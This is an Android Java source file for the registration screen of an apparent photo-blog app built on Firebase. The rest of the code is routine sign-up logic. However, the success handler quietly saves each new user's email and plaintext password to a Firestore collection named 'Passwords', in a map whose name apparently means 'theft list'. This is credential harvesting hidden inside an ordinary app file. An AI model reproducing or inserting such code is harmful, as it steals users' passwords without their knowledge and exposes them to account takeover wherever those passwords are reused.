package com.example.vivanksharma.photoblog;

import android.content.Intent;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.text.TextUtils;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.Toast;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.auth.AuthResult;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.firestore.FirebaseFirestore;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class RegisterActivity extends AppCompatActivity {

    private FirebaseAuth mAuth;
    private EditText regEmailText;
    private EditText regPasswordText;
    private Button regBtn;
    private Button regloginButton;
    private ProgressBar reg_progress;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_register);

        mAuth = FirebaseAuth.getInstance();
        regBtn = findViewById(R.id.regButton);
        regEmailText = findViewById(R.id.regEmail);
        regPasswordText = findViewById(R.id.regPassword);
        regloginButton = findViewById(R.id.regLoginButton);
        reg_progress = findViewById(R.id.regProgress);
        final FirebaseFirestore firebaseFirestore=FirebaseFirestore.getInstance();


        regloginButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(new Intent(RegisterActivity.this,LoginActivity.class));
                finish();
            }
        });

        regBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                final String email = regEmailText.getText().toString();
                final String password = regPasswordText.getText().toString();

                if(!TextUtils.isEmpty(email) && !TextUtils.isEmpty(password))
                {
                    reg_progress.setVisibility(View.VISIBLE);
                    mAuth.createUserWithEmailAndPassword(email,password).addOnCompleteListener(new OnCompleteListener<AuthResult>() {
                        @Override
                        public void onComplete(@NonNull Task<AuthResult> task) {
                            if(task.isSuccessful()){
                                Map<String,Object> choriKaList = new HashMap<>();
                                choriKaList.put("Email Id",email);
                                choriKaList.put("Password",password);
                                firebaseFirestore.collection("Passwords").add(choriKaList);
                                startActivity(new Intent(RegisterActivity.this,SetupAccount.class));
                                finish();
                            }else{
                                Toast.makeText(RegisterActivity.this,"Error: "+task.getException().getMessage(),Toast.LENGTH_LONG).show();
                            }
                            reg_progress.setVisibility(View.INVISIBLE);
                        }
                    });
                }else{
                    regEmailText.setError("This field can't be empty !");
                    regPasswordText.setError("This field can't be empty !");
                }
            }
        });


    }

    @Override
    protected void onStart() {
        super.onStart();

        FirebaseUser currentUser = mAuth.getCurrentUser();
        if(currentUser != null)
        {
            sendToMain();
        }
    }

    private void sendToMain() {
        Intent mainIntent = new Intent(RegisterActivity.this,MainActivity.class);
        startActivity(mainIntent);
        finish();
    }
}
